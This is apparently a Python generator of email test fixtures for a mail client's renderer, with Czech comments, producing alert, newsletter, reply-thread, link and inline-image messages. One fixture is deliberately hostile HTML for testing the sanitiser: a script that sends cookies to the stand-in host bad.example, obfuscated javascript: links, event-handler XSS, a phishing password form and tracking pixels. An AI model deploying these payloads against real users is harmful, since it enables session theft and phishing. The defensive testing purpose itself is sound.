#!/usr/bin/env python3
"""Zpravy pro testy zobrazeni (fixtures-view/): HTML jako bezpecnostni upozorneni velkych sluzeb, newsletter s tabulkami
a vzdalenymi obrazky, vlakno odpovedi s citacemi, prosty text plny odkazu, zakerne HTML (skripty, iframe, sledovaci
pixel, javascript: odkazy) a HTML s vlozenym obrazkem (cid:). Vymyslene sluzby a adresy, zadne skutecne znacky.

    python3 make_view_fixtures.py   # prepise fixtures-view/*.eml
"""
import base64
import os
import struct
import zlib
from email.message import EmailMessage
from email.policy import SMTP

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "fixtures-view")
REMOTE = os.environ.get("REMOTE_ORIGIN", "http://127.0.0.1:9")


def png(w, h, rgb):
    raw = b"".join(b"\x00" + bytes(rgb) * w for _ in range(h))
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b"")


def base(subject, sender="Účet Example <no-reply@accounts.example.com>"):
    m = EmailMessage()
    m["From"] = sender
    m["To"] = "Tester <tester@example.test>"
    m["Subject"] = subject
    m["Date"] = "Tue, 10 Nov 2026 09:12:00 +0100"
    m["Message-ID"] = "<%s@example.com>" % abs(hash(subject))
    return m


def security_alert():
    m = base("Upozornění zabezpečení: nové přihlášení v systému Linux")
    m.set_content("Nové přihlášení k účtu tester@example.test\n\nZkontrolovat aktivitu: https://myaccount.example.com/notifications\n")
    m.add_alternative("""<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title>Upozornění</title></head>
<body style="margin:0;padding:0;background-color:#f1f3f4">
<table width="100%" cellpadding="0" cellspacing="0" bgcolor="#f1f3f4"><tr><td align="center" style="padding:24px">
<table width="520" style="background:#ffffff;border:1px solid #dadce0;border-radius:8px;font-family:Arial,sans-serif">
<tr><td style="padding:32px 40px 12px;text-align:center;border-bottom:1px solid #dadce0">
<img src="REMOTE/logo.png" width="74" height="24" alt="Example">
<div style="font-size:24px;color:#202124;padding-top:16px">Nové přihlášení v systému Linux</div>
<div style="font-size:14px;color:#3c4043;padding-top:8px">tester@example.test</div></td></tr>
<tr><td style="padding:20px 40px;font-size:14px;line-height:20px;color:#3c4043">
Zaznamenali jsme nové přihlášení k vašemu účtu na zařízení se systémem Linux. Pokud jste to byli vy, nemusíte nic dělat.
Pokud ne, pomůžeme vám zabezpečit účet.
<div style="padding-top:28px;text-align:center"><a href="https://myaccount.example.com/notifications?x=1&amp;y=2" style="background:#1a73e8;color:#ffffff;padding:10px 24px;border-radius:4px;text-decoration:none;font-weight:bold">Zkontrolovat aktivitu</a></div>
</td></tr></table>
<div style="font-size:11px;color:#5f6368;padding-top:16px">Tento e-mail vám posíláme kvůli důležitým změnám ve vašem účtu.</div>
<img src="REMOTE/open-pixel.gif?id=123" width="1" height="1" alt="">
</td></tr></table></body></html>""".replace("REMOTE", REMOTE), subtype="html")
    return m


def newsletter():
    m = base("Týdenní přehled: 5 tipů pro Linux", "Zpravodaj Example <news@news.example.org>")
    m["List-Unsubscribe"] = "<https://news.example.org/unsubscribe?u=1>"
    m.set_content("Týdenní přehled – textová verze. Číst online: https://news.example.org/w/45\n")
    m.add_alternative("""<html><head>
<link rel="stylesheet" href="REMOTE/style.css">
<style type="text/css">
@import url("REMOTE/import.css");
body { background: #eef2f7; }
.card { background: #ffffff; border-radius: 10px; padding: 16px; }
h1 { color: #0b3d91; font-size: 26px; }
.hero { background: url("REMOTE/hero.jpg") no-repeat; height: 120px; }
td.col { width: 50%; vertical-align: top; }
</style></head>
<body>
<table class="card" width="600" align="center"><tr><td colspan="2"><h1>5 tipů pro Linux</h1><div class="hero"></div></td></tr>
<tr><td class="col"><img src="REMOTE/tip1.jpg" width="280" height="160" alt="Tip 1: klávesové zkratky"><h3>Klávesové zkratky</h3>
<p>Naučte se <b>Super+mezerník</b> a <i>Alt+Tab</i>. <a href="https://news.example.org/a/1">Číst dál »</a></p></td>
<td class="col"><img src="REMOTE/tip2.jpg" width="280" height="160" alt="Tip 2: zálohy"><h3>Zálohy</h3>
<ul><li>Jednou týdně</li><li>Na externí disk</li><li>Ověřte obnovu</li></ul></td></tr>
<tr><td colspan="2" style="font-size:12px;color:#666">Nechcete dostávat zpravodaj? <a href="https://news.example.org/unsubscribe?u=1">Odhlásit</a></td></tr>
</table></body></html>""".replace("REMOTE", REMOTE), subtype="html")
    return m


def reply_thread():
    m = base("Re: Re: Porada ve čtvrtek", "Petr Dvořák <petr@example.org>")
    m["In-Reply-To"] = "<p2@example.org>"
    m["References"] = "<p1@example.org> <p2@example.org>"
    m.set_content("""Ahoj Jano,

čtvrtek v 10:00 mi vyhovuje. Podklady jsou na https://intranet.example.org/porady/2026-11-12.

On Mon, 9 Nov 2026 at 18:02, Jana Nováková <jana@example.org> wrote:
> Petře, hodí se ti čtvrtek?
> Program:
> 1. rozpočet
> 2. termíny
>
> On Mon, 9 Nov 2026 at 9:15, Petr Dvořák <petr@example.org> wrote:
>> Navrhuji poradu tento týden, kdy máte čas?
>>> Původní zpráva hluboko v citaci.

--
Petr Dvořák
tel. +420 123 456 789
www.example.org
""")
    return m


def links_plain():
    m = base("Odkazy a tabulka", "Jan Novák <jan@example.cz>")
    m.set_content("""Dobrý den,

posílám odkazy (viz https://example.cz/dokumenty/zprava.pdf).
Web: www.example.cz, e-mail podpora@example.cz nebo mailto:info@example.cz?subject=Dotaz.
Dlouhá adresa: https://example.cz/velmi/dlouha/cesta/ktera/se/musi/zalomit/aby/se/vesla/do/okna?parametr=hodnota&dalsi=123#kotva
V závorce (https://example.cz/a_(b)) a na konci věty https://example.cz/konec.

+--------+---------+-------+
| Měsíc  | Příjem  | Výdaj |
+--------+---------+-------+
| leden  | 12 000  | 8 000 |
| únor   | 15 500  | 9 200 |
+--------+---------+-------+

S pozdravem
Jan
""")
    return m


def malicious():
    m = base("Výhra! Klikněte zde", "Podvodník <scam@bad.example>")
    m.set_content("text")
    m.add_alternative("""<html><head><meta http-equiv="refresh" content="0;url=https://bad.example/redirect">
<base href="https://bad.example/"><script>alert('x');document.location='https://bad.example/steal?c='+document.cookie</script>
<style>body{background:url(REMOTE/bg.png)} .x{behavior:url(x.htc)}</style></head>
<body onload="alert(1)">
<h2 onclick="alert(2)">Gratulujeme</h2>
<p>Text zprávy <a href="javascript:alert(3)">javascript odkaz</a>, <a href="jav&#x61;script:alert(4)">schovaný</a>,
<a href=" JaVaScRiPt:alert(5)">velká písmena</a>, <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg2KTwvc2NyaXB0Pg==">data</a>,
<a href="vbscript:msgbox(7)">vbscript</a>, <a href="https://legit.example.org/ok">bezpečný odkaz</a>.</p>
<img src="x" onerror="alert(8)"><img src="REMOTE/track.gif" width="1" height="1">
<iframe src="https://bad.example/frame"></iframe><object data="https://bad.example/x.swf"></object><embed src="x.swf">
<form action="https://bad.example/login" method="post"><input name="password" type="password"><button>Přihlásit</button></form>
<svg onload="alert(9)"><script>alert(10)</script></svg>
<div style="width:expression(alert(11))">expression</div>
<a href="https://legit.example.org/" onmouseover="alert(12)" style="color:red">hover</a>
<math><mtext><script>alert(13)</script></mtext></math>
<noscript><p title="</noscript><img src=x onerror=alert(14)>">noscript</p></noscript>
<p>Konec ZAKERNE_KONEC</p>
</body></html>""".replace("REMOTE", REMOTE), subtype="html")
    return m


def inline_image():
    m = base("Fotka z výletu", "Eva Malá <eva@example.cz>")
    m.set_content("Ahoj, posílám fotku.\n")
    m.add_alternative("<html><body><p>Ahoj, posílám <b>fotku</b>:</p><img src=\"cid:foto1@example\" alt=\"výlet\"></body></html>", subtype="html")
    html = m.get_payload()[1]
    html.add_related(png(40, 24, (220, 60, 40)), maintype="image", subtype="png", cid="<foto1@example>")
    m.add_attachment(png(30, 30, (40, 120, 220)), maintype="image", subtype="png", filename="mapa trasy.png")
    m.add_attachment(b"%PDF-1.4 test\n", maintype="application", subtype="pdf", filename="program.pdf")
    return m


def main(out=OUT, remote=None):
    """remote: adresa testovaciho serveru HTTP pro vzdalene obrazky (test, ze se bez povoleni nic nestahne)."""
    global REMOTE
    if remote:
        REMOTE = remote
    os.makedirs(out, exist_ok=True)
    for name, fn in (("security-alert", security_alert), ("newsletter", newsletter), ("reply-thread", reply_thread),
                     ("links-plain", links_plain), ("malicious", malicious), ("inline-image", inline_image)):
        with open(os.path.join(out, name + ".eml"), "wb") as f:
            f.write(fn().as_bytes(policy=SMTP))


if __name__ == "__main__":
    main()
